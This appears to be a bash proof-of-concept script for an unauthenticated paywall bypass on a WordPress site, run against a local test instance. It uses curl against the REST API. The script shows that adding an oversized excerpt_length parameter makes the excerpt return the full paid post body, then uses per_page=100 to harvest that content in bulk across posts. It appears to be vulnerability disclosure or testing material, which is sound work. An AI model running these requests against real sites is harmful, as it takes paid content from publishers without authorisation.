#!/usr/bin/env bash
# Unauthenticated PoC. No account, no cookies.
set -eu
cd "$(dirname "$0")"
B="http://127.0.0.1:8093"
P=$(cat post_id.txt)

show() { python3 -c "
import json,sys,re
d=json.load(sys.stdin)
if isinstance(d,list): d=[x for x in d if x.get('id')==$P][0]
v=d.get(sys.argv[1],{})
v=v.get('rendered','') if isinstance(v,dict) else str(v)
t=re.sub(r'<[^>]+>','',v).strip()
print('    %-18s %4d chars   SECRET-TOKEN-7731=%s   END-OF-PAID-BODY=%s'
      % (sys.argv[1]+'.rendered', len(t),
         'YES' if 'SECRET-TOKEN-7731' in t else 'no',
         'YES' if 'END-OF-PAID-BODY' in t else 'no'))" "$1"; }

echo "STEP 1  baseline, the paywall should be active"
echo "  GET /?rest_route=/wp/v2/posts/$P"
R=$(curl -s "$B/?rest_route=/wp/v2/posts/$P")
echo "$R" | show content
echo "$R" | show excerpt

echo
echo "STEP 2  bypass, same response"
echo "  GET /?rest_route=/wp/v2/posts/$P&excerpt_length=100000"
R=$(curl -s "$B/?rest_route=/wp/v2/posts/$P&excerpt_length=100000")
echo "$R" | show content
echo "$R" | show excerpt

echo
echo "STEP 3  bulk harvest"
echo "  GET /?rest_route=/wp/v2/posts&per_page=100&excerpt_length=100000&_fields=id,excerpt"
curl -s "$B/?rest_route=/wp/v2/posts&per_page=100&excerpt_length=100000&_fields=id,excerpt" | show excerpt

echo
echo "Expected: step 1 content is truncated with no END-OF-PAID-BODY, while step 2"
echo "excerpt returns the full body in the very same response."
